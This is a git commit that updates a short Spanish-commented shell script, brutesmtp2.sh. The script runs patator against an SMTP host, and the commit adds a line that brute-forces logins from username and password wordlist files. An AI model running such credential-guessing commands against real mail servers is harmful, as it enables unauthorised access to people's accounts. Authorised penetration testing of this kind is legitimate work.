ef5c8fbed6f05d606bf83ed99ef2c6e6b8ea008e
hackingyseguridad <antonio_taboada@hotmail.es>
2024-06-06 17:18:31 +0200

    Update brutesmtp2.sh

--- brutesmtp2.sh
+++ brutesmtp2.sh
@@ -2,3 +2,6 @@ echo
 echo
 echo "smtp sin autenticacion"
 patator smtp_login host=$1
+echo
+echo "Fuerza bruta smtp con patator"
+patator smtp_login  host=$1 inputs='FILE0\nFILE1' 0=usuarios0.txt 1=claves0.txt
